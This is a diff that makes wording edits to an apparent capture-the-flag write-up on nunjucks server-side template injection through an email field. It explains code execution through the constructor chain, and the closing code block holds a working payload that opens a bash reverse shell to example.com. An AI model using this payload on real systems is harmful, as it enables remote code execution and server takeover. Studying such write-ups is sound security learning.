@@ -47,9 +47,9 @@ let transporter = nodemailer.createTransport({
 
 transporter.sendMail(message);
 ```
-The only field we can control is the email address. After a bit of staring, I decide to do a little research about the nunjucks, the templating thing, as a lot of websites seem to be vulnerable to different templating attacks if the template is exposed to user-defined content. 
+The only field we can control is the email address. After a bit of staring I decide to do a little research about nunjucks, the templating engine, as a lot of websites seem to be vulnerable to different templating attacks if the template is exposed to raw user-defined content. 
 
-I come across a [GitHub issue](https://github.com/mozilla/nunjucks-docs/issues/17) which seems to contain exactly what I'm looking for. In nunjucks templates you can execute arbitrary code with creating a function and executing it with `{{ ({}).constructor.__proto__.constructor("code goes here")() }}`. With this you can execute shell commands, and get a reverse shell.
+I come across a [GitHub issue](https://github.com/mozilla/nunjucks-docs/issues/17) which seems to contain exactly what I'm looking for. In nunjucks templates you can execute arbitrary code by creating a function and executing it with `{{ ({}).constructor.__proto__.constructor("code goes here")() }}`. With this you can execute shell commands, and get a reverse shell.
 
 ```js
 {{ ({}).constructor.__proto__.constructor("process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/example.com/80 0>&1'`)")() }}
